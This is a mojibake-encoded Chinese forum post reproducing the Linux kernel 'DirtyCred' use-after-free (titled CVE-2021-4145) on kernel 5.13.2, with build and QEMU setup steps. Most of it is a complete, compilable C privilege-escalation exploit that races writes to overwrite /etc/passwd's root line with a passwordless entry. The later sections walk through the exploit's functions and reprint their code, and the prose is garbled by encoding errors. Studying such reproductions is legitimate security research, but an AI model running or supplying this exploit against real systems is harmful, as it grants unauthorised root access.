#  ã€æ¼æ´åˆ†æã€‘CVE-2021-4145 dirty credæ¼æ´å¤ç°   
åŸåˆ› å¾çˆ±pojie  å¾çˆ±ç ´è§£è®ºå›   2024-03-16 09:25  
  
**ä½œè€…****è®º****å›è´¦å·ï¼šxia0ji233**  
  
  
å¤ç°ä¸€ä¸‹ dirty cred æ¼æ´  
  
<!--more-->  
  
åŒæ ·æœ¬ç¯‡æ–‡ç« é‡‡ç”¨çš„è¿˜æ˜¯ ç¯å¢ƒé…ç½®â€”â€”æ¼æ´éªŒè¯â€”â€”æºç åˆ†æâ€”â€”ä»£ç è°ƒè¯• è¿™å››éƒ¨åˆ†ã€‚  
## ç¯å¢ƒé…ç½®  
### å†…æ ¸ç¼–è¯‘  
  
é€‰ç”¨ä¸€ä¸ªæ¼æ´å­˜åœ¨çš„ç‰ˆæœ¬ï¼Œä¾‹å¦‚Â 5.13.2ã€‚  
  
ä¸‹é¢å°±æ˜¯ç¼–è¯‘å†…æ ¸ä¼šè¸©å¾—ä¸€äº›å‘ï¼Œæˆ‘å°†å®Œæ•´å¤è¿°ä¸€éï¼š  
  
æºç ä¸‹è½½å¥½ä¹‹åï¼Œå…ˆÂ make menuconfigÂ å¼€å¯è°ƒè¯•ç¬¦å·ï¼Œkernel hacking->kernel debuggingÂ å‹¾é€‰ï¼Œkernel hacking->Compile-time checks and compiler options->Compile the kernel with debug infoÂ å‹¾é€‰ã€‚  
  
ä¿å­˜é€€å‡ºä¹‹åè¿˜éœ€è¦åŠ ä¸Šä¸¤ä¸ªé€‰é¡¹ã€‚  
  
vim .configï¼Œæ‰“å¼€ä¹‹åæ‰¾åˆ°ä¸¤ä¸ªé€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯Â CONFIG_FUSE_FSÂ å¦ä¸€ä¸ªæ˜¯Â CONFIG_USER_NSï¼Œè¿™ä¸¤ä¸ªé€‰é¡¹éƒ½éœ€è¦å¯åŠ¨ï¼Œé»˜è®¤ç”Ÿæˆçš„Â configÂ åº”è¯¥æ˜¯æ²¡æœ‰å¯ç”¨è¿™ä¸¤ä¸ªé€‰é¡¹çš„ã€‚  
  
é…ç½®å®Œæˆä¹‹åå°±å¯ä»¥å¼€å§‹ç¼–è¯‘äº†ã€‚  
  
ç¼–è¯‘å®Œæˆä¹‹åï¼Œåœ¨æœ¬ç›®å½•ä¸‹å¾—åˆ°å¸¦å®Œæ•´ç¬¦å·çš„Â vmlinuxï¼Œåœ¨Â arch/x86/boot/Â å¾—åˆ°å¯åŠ¨å†…æ ¸Â bzImage  
### æ–‡ä»¶ç³»ç»Ÿç¼–è¯‘  
  
ä¾ç„¶æ˜¯é‡‡ç”¨ busyboxï¼Œæ–¹æ³•å’Œä¹‹å‰æ˜¯ä¸€è‡´çš„ï¼Œçœ‹æˆ‘æœ€å¼€å§‹çš„ç¯å¢ƒæ­å»ºå³å¯ï¼Œè¿™é‡Œå¯ä»¥æå‰æŠŠ EXP ç¼–è¯‘è¿›å»ç„¶åæ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿã€‚  
### å¯åŠ¨è„šæœ¬  
  
å°±æ˜¯ä¼ è¯´ä¸­çš„Â start.sh  
  
è¿™é‡Œç»™å¤§å®¶å‚è€ƒä¸€ä¸‹æˆ‘çš„ qemu å¯åŠ¨å‚æ•°ã€‚  
```
qemu-system-x86_64 \
Â  Â Â  Â Â Â -m 256M \
Â  Â Â  Â Â Â -smp 2,cores=2,threads=1\
Â  Â Â  Â Â Â -kernel ./bzImage \
Â  Â Â  Â Â Â -initrdÂ Â ./rootfs.img \
Â  Â Â  Â Â Â -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"\
Â  Â Â  Â Â Â -cpu qemu64 \
Â  Â Â  Â Â Â -netdev user,id=t0, \
Â  Â Â  Â Â Â -device e1000,netdev=t0,id=nic0 \
Â  Â Â  Â Â Â -nographic \
Â  Â Â  Â Â Â #-s -S\
```  
  
æœ€åä¸€è¡Œç”¨äºè°ƒè¯•ï¼Œå¤§å®¶ä¸éœ€è¦è°ƒè¯•å¯ä»¥å…ˆæ³¨é‡Šæ‰ï¼Œå…¶å®ƒå‚æ•°è§£é‡Šå¦‚ä¸‹ï¼š  
1. -m 256M: æŒ‡å®šè™šæ‹Ÿæœºçš„å†…å­˜å¤§å°ä¸º 256MBã€‚  
  
1. -smp 2,cores=2,threads=1: æŒ‡å®šä½¿ç”¨ 2 ä¸ª CPUï¼Œæ¯ä¸ª CPU æ‹¥æœ‰ 2 ä¸ªæ ¸å¿ƒï¼Œæ¯ä¸ªæ ¸å¿ƒåªæœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚  
  
1. -kernel ./bzImage: æŒ‡å®šäº†å†…æ ¸æ–‡ä»¶ã€‚  
  
1. -initrd ./rootfs.img: æŒ‡å®šæˆ‘ä»¬åˆ¶ä½œçš„ Linux æ–‡ä»¶ç³»ç»Ÿã€‚  
  
1. -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr":æŒ‡å®šäº†ä¼ é€’ç»™å†…æ ¸çš„å¯åŠ¨å‚æ•°ã€‚è¿™é‡Œçš„ quiet å¯ä»¥è®©å†…æ ¸ä¸è¾“å‡ºå¾ˆå¤šä¿¡æ¯ç›´æ¥å¯åŠ¨ï¼ŒnokaslrÂ ä¸€å®šè¦åŠ ï¼Œå¦åˆ™æ–­ç‚¹æ— æ³•å‘½ä¸­ã€‚  
  
1. -cpu qemu64: æŒ‡å®šä½¿ç”¨ QEMU çš„é»˜è®¤ x86_64 CPU æ¨¡æ‹Ÿå™¨ã€‚  
  
1. -netdev user,id=t0,: æŒ‡å®šäº†ç”¨æˆ·æ¨¡å¼ç½‘ç»œè®¾å¤‡ã€‚  
  
1. -device e1000,netdev=t0,id=nic0: æŒ‡å®šäº†è¦æ·»åŠ åˆ°è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾å¤‡ã€‚  
  
1. -nographic: æ— éœ€å›¾å½¢ç•Œé¢çš„æƒ…å†µä¸‹è¿è¡Œ QEMUã€‚  
  
ç°åœ¨åœ¨ç›®å½•ä¸‹åº”è¯¥æœ‰äº†Â start.shï¼ŒbzImageÂ å’ŒÂ rootfs.imgï¼Œæ–‡ä»¶ç³»ç»Ÿå¯ä»¥æå‰æ‰“åŒ… exp è¿›å»ã€‚  
## æ¼æ´éªŒè¯  
### EXPéªŒè¯  
  
ç”¨ç½‘ä¸Šé€šç”¨çš„ä¸€ä¸ª EXPã€‚  
```
#define _GNU_SOURCE

#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <assert.h>
#include <pthread.h>
#include <sys/uio.h>

#include <linux/bpf.h>
#include <linux/kcmp.h>

#include <linux/capability.h>

static void die(const char *fmt, ...) {
Â  Â  va_list params;

Â  Â  va_start(params, fmt);
Â  Â  vfprintf(stderr, fmt, params);
Â  Â  va_end(params);
Â  Â  exit(1);
}

static void use_temporary_dir(void) {
Â  Â  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data");
Â  Â  char *tmpdir = "exp_dir";
Â  Â  if (!tmpdir)
Â  Â Â  Â Â Â exit(1);
Â  Â  if (chmod(tmpdir, 0777))
Â  Â Â  Â Â Â exit(1);
Â  Â  if (chdir(tmpdir))
Â  Â Â  Â Â Â exit(1);
}

static bool write_file(const char *file, const char *what, ...) {
Â  Â  char buf[1024];
Â  Â  va_list args;
Â  Â  va_start(args, what);
Â  Â  vsnprintf(buf, sizeof(buf), what, args);
Â  Â  va_end(args);
Â  Â  buf[sizeof(buf) - 1] = 0;
Â  Â  int len = strlen(buf);
Â  Â  int fd = open(file, O_WRONLY | O_CLOEXEC);
Â  Â  if (fd == -1)
Â  Â Â  Â Â Â return false;
Â  Â  if (write(fd, buf, len) != len) {
Â  Â Â  Â Â Â int err = errno;
Â  Â Â  Â Â Â close(fd);
Â  Â Â  Â Â Â errno = err;
Â  Â Â  Â Â Â return false;
Â  Â  }
Â  Â  close(fd);
Â  Â  return true;
}

static void setup_common() {
Â  Â  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {

Â  Â  }
}

static void loop();

static void sandbox_common() {
Â  Â  prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
Â  Â  setsid();
Â  Â  struct rlimit rlim;
Â  Â  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
Â  Â  setrlimit(RLIMIT_AS, &rlim);
Â  Â  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
Â  Â  setrlimit(RLIMIT_MEMLOCK, &rlim);
Â  Â  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
Â  Â  setrlimit(RLIMIT_FSIZE, &rlim);
Â  Â  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
Â  Â  setrlimit(RLIMIT_STACK, &rlim);
Â  Â  rlim.rlim_cur = rlim.rlim_max = 0;
Â  Â  setrlimit(RLIMIT_CORE, &rlim);
Â  Â  rlim.rlim_cur = rlim.rlim_max = 256;
Â  Â  setrlimit(RLIMIT_NOFILE, &rlim);
Â  Â  if (unshare(CLONE_NEWNS)) {
Â  Â  }
Â  Â  if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)) {
Â  Â  }
Â  Â  if (unshare(CLONE_NEWIPC)) {
Â  Â  }
Â  Â  if (unshare(0x02000000)) {
Â  Â  }
Â  Â  if (unshare(CLONE_NEWUTS)) {
Â  Â  }
Â  Â  if (unshare(CLONE_SYSVSEM)) {
Â  Â  }
Â  Â  typedef struct {
Â  Â Â  Â Â Â const char *name;
Â  Â Â  Â Â Â const char *value;
Â  Â  } sysctl_t;
Â  Â  static const sysctl_t sysctls[] = {
Â  Â Â  Â Â Â {"/proc/sys/kernel/shmmax", "16777216"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/shmall", "536870912"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/shmmni", "1024"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/msgmax", "8192"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/msgmni", "1024"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/msgmnb", "1024"},
Â  Â Â  Â Â Â {"/proc/sys/kernel/sem", "1024 1048576 500 1024"},
Â  Â  };
Â  Â  unsigned i;
Â  Â  for (i = 0; i < sizeof(sysctls) / sizeof(sysctls[0]); i++)
Â  Â Â  Â Â Â write_file(sysctls[i].name, sysctls[i].value);
}

static int wait_for_loop(int pid) {
Â  Â  if (pid < 0)
Â  Â Â  Â Â Â exit(1);
Â  Â  int status = 0;
Â  Â  while (waitpid(-1, &status, __WALL) != pid) {
Â  Â  }
Â  Â  return WEXITSTATUS(status);
}

static void drop_caps(void) {
Â  Â  struct __user_cap_header_struct cap_hdr = {};
Â  Â  struct __user_cap_data_struct cap_data[2] = {};
Â  Â  cap_hdr.version = _LINUX_CAPABILITY_VERSION_3;
Â  Â  cap_hdr.pid = getpid();
Â  Â  if (syscall(SYS_capget, &cap_hdr, &cap_data))
Â  Â Â  Â Â Â exit(1);
Â  Â  const int drop = (1 << CAP_SYS_PTRACE) | (1 << CAP_SYS_NICE);
Â  Â  cap_data[0].effective &= ~drop;
Â  Â  cap_data[0].permitted &= ~drop;
Â  Â  cap_data[0].inheritable &= ~drop;
Â  Â  if (syscall(SYS_capset, &cap_hdr, &cap_data))
Â  Â Â  Â Â Â exit(1);
}

static int real_uid;
static int real_gid;
__attribute__((aligned(64 << 10))) static char sandbox_stack[1 << 20];

static int namespace_sandbox_proc() {
Â  Â  sandbox_common();
Â  Â  loop();
}

static int do_sandbox_namespace() {
Â  Â  setup_common();
Â  Â  real_uid = getuid();
Â  Â  real_gid = getgid();
Â  Â  mprotect(sandbox_stack, 4096, PROT_NONE);
Â  Â  while (1) {
Â  Â Â  Â Â Â int pid =
Â  Â Â  Â Â  Â Â  Â clone(namespace_sandbox_proc, &sandbox_stack[sizeof(sandbox_stack) - 64],
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â CLONE_NEWUSER | CLONE_NEWPID, 0);
Â  Â Â  Â Â Â if (pid == -1) {
Â  Â Â  Â Â  Â Â  Â perror("clone");
Â  Â Â  Â Â  Â Â  Â printf("errno: %d\n", errno);
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â int ret_status = wait_for_loop(pid);
Â  Â Â  Â Â Â if (ret_status == 0) {
Â  Â Â  Â Â  Â Â  Â printf("[!] succeed\n");
Â  Â Â  Â Â  Â Â  Â sleep(1);
Â  Â Â  Â Â  Â Â  Â printf(" checking /etc/passwd\n\n");
Â  Â Â  Â Â  Â Â  Â printf(" executing command : head -n 5 /etc/passwd\n");
Â  Â Â  Â Â  Â Â  Â sleep(1);
Â  Â Â  Â Â  Â Â  Â system("head -n 5 /etc/passwd");
Â  Â Â  Â Â  Â Â  Â return 1;
Â  Â Â  Â Â Â } else {
Â  Â Â  Â Â  Â Â  Â printf("[-] failed to write, retry...\n\n");
Â  Â Â  Â Â  Â Â  Â sleep(3);
Â  Â Â  Â Â Â }
Â  Â  }
}

// ===========================

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

#define MAX_FILE_NUM 1000
int uaf_fd;
int fds[MAX_FILE_NUM];

int run_write = 0;
int run_spray = 0;
char *cwd;

void *slow_write() {
Â  Â  printf("start slow write to get the lock\n");Â  Â  int fd = open("./uaf", 1);

Â  Â  if (fd < 0) {
Â  Â Â  Â Â Â perror("error open uaf file");
Â  Â Â  Â Â Â exit(-1);
Â  Â  }

Â  Â  unsigned long int addr = 0x30000000;
Â  Â  int offset;
Â  Â  for (offset = 0; offset < 0x80000; offset++) {
Â  Â Â  Â Â Â void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
Â  Â Â  Â Â Â if (r < 0) {
Â  Â Â  Â Â  Â Â  Â printf("allocate failed at 0x%x\n", offset);
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  assert(offset > 0);

Â  Â  void *mem = (void *)(addr);
Â  Â  memcpy(mem, "hhhhh", 5);

Â  Â  struct iovec iov[5];
Â  Â  for (int i = 0; i < 5; i++) {
Â  Â Â  Â Â Â iov[i].iov_base = mem;
Â  Â Â  Â Â Â iov[i].iov_len = (offset - 1) * 0x1000;
Â  Â  }

Â  Â  run_write = 1;
Â  Â  if (writev(fd, iov, 5) < 0) {
Â  Â Â  Â Â Â perror("slow write");
Â  Â  }
Â  Â  printf("write done!\n");}

void *write_cmd() {
Â  Â  char data[1024] = "root::0:0:root:/root:/bin/sh\n\n";
Â  Â  struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

Â  Â  while (!run_write) {
Â  Â  }
Â  Â  run_spray = 1;
Â  Â  if (writev(uaf_fd, &iov, 1) < 0) {
Â  Â Â  Â Â Â printf("failed to write\n");
Â  Â  }
Â  Â  printf("overwrite done! It should be after the slow write\n");}

int spray_files() {

Â  Â  while (!run_spray) {
Â  Â  }
Â  Â  int found = 0;

Â  Â  printf("got uaf fd %d, start spray....\n", uaf_fd);Â  Â  for (int i = 0; i < MAX_FILE_NUM; i++) {
Â  Â Â  Â Â Â fds[i] = open("/etc/passwd", O_RDONLY);
Â  Â Â  Â Â Â if (fds[i] < 0) {
Â  Â Â  Â Â  Â Â  Â perror("open file");
Â  Â Â  Â Â  Â Â  Â printf("%d\n", i);
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==
Â  Â Â  Â Â  Â Â  Â 0) {
Â  Â Â  Â Â  Â Â  Â found = 1;
Â  Â Â  Â Â  Â Â  Â printf("[!] found, file id %d\n", i);
Â  Â Â  Â Â  Â Â  Â for (int j = 0; j < i; j++)
Â  Â Â  Â Â  Â Â  Â Â  Â  close(fds[j]);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  if (found) {
Â  Â Â  Â Â Â sleep(4);
Â  Â Â  Â Â Â return 0;
Â  Â  }
Â  Â  return -1;
}

void trigger() {
Â  Â  int fs_fd = syscall(__NR_fsopen, "cgroup", 0);
Â  Â  if (fs_fd < 0) {
Â  Â Â  Â Â Â perror("fsopen");
Â  Â Â  Â Â Â die("");
Â  Â  }

Â  Â  symlink("./data", "./uaf");

Â  Â  uaf_fd = open("./uaf", 1);
Â  Â  if (uaf_fd < 0) {
Â  Â Â  Â Â Â die("failed to open symbolic file\n");
Â  Â  }

Â  Â  if (syscall(__NR_fsconfig, fs_fd, 5, "source", 0, uaf_fd)) {
Â  Â Â  Â Â Â perror("fsconfig");
Â  Â Â  Â Â Â exit(-1);
Â  Â  }
Â  Â  // free the uaf fd
Â  Â  close(fs_fd);
}

void loop() {
Â  Â  trigger();

Â  Â  pthread_t p_id;
Â  Â  pthread_create(&p_id, NULL, slow_write, NULL);

Â  Â  pthread_t p_id_cmd;
Â  Â  pthread_create(&p_id_cmd, NULL, write_cmd, NULL);
Â  Â  exit(spray_files());
}

int main(void) {
Â  Â  cwd = get_current_dir_name();
Â  Â  syscall(__NR_mmap, 0x1ffff000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
Â  Â  syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
Â  Â  syscall(__NR_mmap, 0x21000000ul, 0x1000ul, 0ul, 0x32ul, -1, 0ul);
Â  Â  use_temporary_dir();
Â  Â  do_sandbox_namespace();
Â  Â  return 0;
}
```  
  
ç¼–è¯‘å‘½ä»¤ä¸ºÂ gcc -g exp.c -o exp -static -lpthread  
  
è¿™é‡Œæˆ‘å¾ˆç®€å•åœ°å°†Â /etc/passwdÂ çš„ç¬¬ä¸€é¡¹å†™æˆÂ root::0:0:root:/root:/bin/sh\n\nï¼Œå»æ‰å…¶ä¸­çš„Â xÂ è®©å®ƒæ²¡æœ‰å¯†ç ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKLrWW7Tu4GunpcnI8hGt1DfXlY3tJAibzlVtiauUO4FzALSYRyXoVGNBQ/640?wx_fmt=png&from=appmsg "")  
  
å¯ä»¥å‘ç°æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚  
### åŸç†æ¦‚è¿°  
  
é€šè¿‡é˜…è¯»Â è®ºæ–‡åŸæ–‡Â èƒ½å¤§æ¦‚çŸ¥é“ EXP çš„åˆ©ç”¨æ€è·¯ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKM6ZYVOPuibj4rjpdVrBmAlZAHsKagh2jZA8HzZRCd7Xibkkf0iaibibzVuw/640?wx_fmt=png&from=appmsg "")  
  
æ­¥éª¤æ˜¯å…ˆæ‰“å¼€ä¸€ä¸ªå…·æœ‰å†™æƒé™çš„æœ¬åœ°æ–‡ä»¶ï¼Œå¯¹å…¶å†™å…¥å†…å®¹ï¼Œåœ¨å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šæ£€æŸ¥ä½ çš„æƒé™ï¼Œéšåå†å»å†™ï¼Œåœ¨æ£€æŸ¥å®Œæƒé™ï¼Œå†™ä¹‹å‰å¯ä»¥ free æ‰è¿™ä¸ªæ–‡ä»¶å†ç«‹é©¬æ‰“å¼€ç‰¹æƒæ–‡ä»¶ï¼ˆ/etc/passwdï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°ç»•è¿‡æƒé™å»å†™ç‰¹æƒæ–‡ä»¶çš„æ“ä½œäº†ã€‚  
  
é…åˆ EXP æ¥çœ‹çœ‹  
### EXPåˆ†æ  
  
ä»Â mainÂ å‡½æ•°å¼€å§‹ï¼Œå…ˆè°ƒç”¨ 3 æ¬¡ mmap å»åˆ†é…å†…å­˜ï¼Œéšåæ–°å»ºäº†ä¸€ä¸ªÂ exp_dirÂ æ–‡ä»¶å¤¹ï¼Œå¹¶åˆ›å»ºäº†Â dataÂ åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­ã€‚  
### do_sandbox_namespace  
  
setup_commonÂ å‡½æ•°æŒ‚è½½äº†ä¸€ä¸ª FUSE æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯æµ‹è¯•ä¸‹æ¥æŒ‚è½½ä¸æˆåŠŸä¹Ÿä¸å½±å“ EXP çš„ä½¿ç”¨ï¼Œéšå mprotect æ”¹å˜å†…å­˜å±æ€§ï¼ˆè¿™é‡Œä¸æ˜¯å¾ˆæ¸…æ¥šä¸ºä»€ä¹ˆæŠŠæ ˆçš„å±æ€§æ¸…é›¶ï¼‰ã€‚éšåå¾ªç¯  
  
åœ¨å¾ªç¯ä¸­è°ƒç”¨Â cloneÂ å»å¯åŠ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒcloneÂ ç†è§£ä¸ºÂ forkÂ æ²¡æœ‰é—®é¢˜ã€‚éšåå­è¿›ç¨‹æ‰§è¡ŒÂ namespace_sandbox_procï¼Œä¸»è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹è¿”å›ï¼Œé‚£ä¹ˆæ¥åˆ†æåˆ†æè¿™ä¸ªå‡½æ•°ã€‚  
#### sandbox_common  
  
å…ˆè®¾ç½®çˆ¶è¿›ç¨‹æ­»äº¡çš„ä¿¡å·ä¸ºÂ SIGKILLï¼Œç„¶åè°ƒç”¨Â setsid()Â å»è„±ç¦»å½“å‰ç»ˆç«¯ã€‚éšååšäº†ä¸€ç³»åˆ—çš„é™åˆ¶ï¼Œåˆ†åˆ«ä¸º  
- åœ°å€ç©ºé—´é™åˆ¶ï¼ˆRLIMIT_ASï¼‰ï¼šé™åˆ¶äº†è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´å¤§å°ä¸º 200MBã€‚  
  
- é”å®šå†…å­˜é™åˆ¶ï¼ˆRLIMIT_MEMLOCKï¼‰ï¼šé™åˆ¶äº†è¿›ç¨‹é”å®šå†…å­˜çš„å¤§å°ä¸º 32MBã€‚  
  
- æ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆRLIMIT_FSIZEï¼‰ï¼šé™åˆ¶äº†è¿›ç¨‹å¯ä»¥åˆ›å»ºçš„æ–‡ä»¶å¤§å°ä¸º 136MBã€‚  
  
- æ ˆå¤§å°é™åˆ¶ï¼ˆRLIMIT_STACKï¼‰ï¼šé™åˆ¶äº†è¿›ç¨‹çš„æ ˆå¤§å°ä¸º 1MBã€‚  
  
- æ ¸å¿ƒæ–‡ä»¶å¤§å°é™åˆ¶ï¼ˆRLIMIT_COREï¼‰ï¼šç¦æ­¢äº†è¿›ç¨‹ç”Ÿæˆæ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ã€‚  
  
- æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°é‡é™åˆ¶ï¼ˆRLIMIT_NOFILEï¼‰ï¼šé™åˆ¶äº†è¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ•°é‡ä¸º 256ã€‚  
  
ç„¶åæŒ‚è½½åˆ›å»ºä¸€ä¸ªæ–°çš„å‘½åç©ºé—´ï¼Œå°†å½“å‰å‘½åç©ºé—´çš„æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹è®¾ç½®ä¸ºç§æœ‰ï¼Œå†åˆ›å»ºå…¶å®ƒçš„ä¸€ç³»åˆ—çš„å‘½åç©ºé—´ã€‚  
  
éšåå†™è¿™äº›å†…æ ¸å‚æ•°æ–‡ä»¶ï¼Œè¿™æ ·å°±åˆ›å»ºäº†ä¸€ä¸ªåˆé€‚çš„ç¯å¢ƒã€‚  
#### loop  
##### trigger  
  
fsopenÂ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»ŸÂ cgroupï¼Œå°†Â ./uafÂ é“¾æ¥åˆ°Â ./dataÂ ä¸Šï¼Œåˆä½¿ç”¨Â fsconfigÂ è¿›è¡Œäº†ä¸€äº›é…ç½®ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹å·²ç»äº§ç”Ÿäº† UAF æ¼æ´ã€‚  
  
ç„¶åå¼€å¯äº†ä¸¤ä¸ªçº¿ç¨‹åˆ†åˆ«å¯åŠ¨Â slow_writeÂ å’ŒÂ write_cmdï¼Œä¸»çº¿ç¨‹è°ƒç”¨Â spray_filesã€‚åˆ†åˆ«å¯¹åº”è®ºæ–‡ç¬¬ä¸€å¼ å›¾çš„çº¿ç¨‹ 1ï¼Œ2ï¼Œ3ã€‚  
  
é‚£ä¹ˆå¯ä»¥å‘ç°ï¼Œä¸»è¦å°±æ˜¯ç”±è¿™ä¸‰ä¸ªçº¿ç¨‹å»æ“ä½œäº†ï¼Œä¹‹å‰ä¸€ç³»åˆ—æ˜¯ä¸ºäº†è¿›è¡Œä¸€ä¸ªç¯å¢ƒé…ç½®åœ¨é€ æˆ UAFï¼Œå› ä¸ºå¹¶æ²¡æœ‰æƒé™ç›´æ¥æ›´æ”¹å†…æ ¸çš„æŸäº›å‚æ•°ï¼Œæ‰€ä»¥ç›´æ¥åˆ›å»ºæ–°çš„å‘½åç©ºé—´å»æ“ä½œçš„ã€‚  
##### slow_write  
```
void *slow_write() {
Â  Â  printf("start slow write to get the lock\n");Â  Â  int fd = open("./uaf", 1);

Â  Â  if (fd < 0) {
Â  Â Â  Â Â Â perror("error open uaf file");
Â  Â Â  Â Â Â exit(-1);
Â  Â  }

Â  Â  unsigned long int addr = 0x30000000;
Â  Â  int offset;
Â  Â  for (offset = 0; offset < 0x80000; offset++) {
Â  Â Â  Â Â Â void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
Â  Â Â  Â Â Â if (r < 0) {
Â  Â Â  Â Â  Â Â  Â printf("allocate failed at 0x%x\n", offset);
Â  Â Â  Â Â Â }
Â  Â  }

Â  Â  assert(offset > 0);

Â  Â  void *mem = (void *)(addr);
Â  Â  memcpy(mem, "hhhhh", 5);

Â  Â  struct iovec iov[5];
Â  Â  for (int i = 0; i < 5; i++) {
Â  Â Â  Â Â Â iov[i].iov_base = mem;
Â  Â Â  Â Â Â iov[i].iov_len = (offset - 1) * 0x1000;
Â  Â  }

Â  Â  run_write = 1;
Â  Â  if (writev(fd, iov, 5) < 0) {
Â  Â Â  Â Â Â perror("slow write");
Â  Â  }
Â  Â  printf("write done!\n");}
```  
  
æ‰“å¼€æ–‡ä»¶å»å æ®å†…æ ¸é”ï¼Œå»æ‰“å¼€Â ./uafï¼Œè‡³äºä¸ºä»€ä¹ˆæ‰“å¼€ uafï¼Œç¨ååˆ†æå†…æ ¸æºç å¯ä»¥è·å¾—å…·ä½“åŸå› ã€‚  
  
è¿™é‡Œé¢è¿˜åˆ†é…äº†å¤§é‡å†…å­˜é¡µï¼Œå¹¶å°è¯•å°†æ‰€æœ‰é¡µé¢å†™å…¥æ–‡ä»¶ï¼Œè¿™ä¸€æ­¥é€šè¿‡æ–‡çŒ®çš„æŸ¥é˜…å¯ä»¥å¾—çŸ¥æ˜¯ä¸ºäº†å‡ç¼“å†™æ–‡ä»¶çš„é€Ÿåº¦ï¼ŒæŠŠå†™æ–‡ä»¶çš„æ—¶é—´çº¿æ‹‰é•¿å°±å¯ä»¥æé«˜æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡ã€‚  
  
ä¸­é—´åœ¨å¼€å§‹å†™ä¹‹å‰ä¼šè®¾ç½®ä¸€ä¸ªå…¨å±€å˜é‡å»å¯åŠ¨ä¸‹ä¸€ä¸ªçº¿ç¨‹ã€‚  
#### write_cmd  
```
void *write_cmd() {
Â  Â  char data[1024] = "root::0:0:root:/root:/bin/sh\n\n";
Â  Â  struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

Â  Â  while (!run_write) {
Â  Â  }
Â  Â  run_spray = 1;
Â  Â  if (writev(uaf_fd, &iov, 1) < 0) {
Â  Â Â  Â Â Â printf("failed to write\n");
Â  Â  }
Â  Â  printf("overwrite done! It should be after the slow write\n");}
```  
  
è¿™ä¸€æ­¥å°±æ˜¯ç­‰åˆ°ç¬¬ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨Â writevÂ çš„æ—¶å€™å¯åŠ¨ç¬¬ä¸‰ä¸ªçº¿ç¨‹ï¼Œç„¶åå†å»å†™æŒ‡å®šçš„æ•°æ®ã€‚  
#### spray_files  
```
int spray_files() {

Â  Â  while (!run_spray) {
Â  Â  }
Â  Â  int found = 0;

Â  Â  printf("got uaf fd %d, start spray....\n", uaf_fd);Â  Â  for (int i = 0; i < MAX_FILE_NUM; i++) {
Â  Â Â  Â Â Â fds[i] = open("/etc/passwd", O_RDONLY);
Â  Â Â  Â Â Â if (fds[i] < 0) {
Â  Â Â  Â Â  Â Â  Â perror("open file");
Â  Â Â  Â Â  Â Â  Â printf("%d\n", i);
Â  Â Â  Â Â Â }
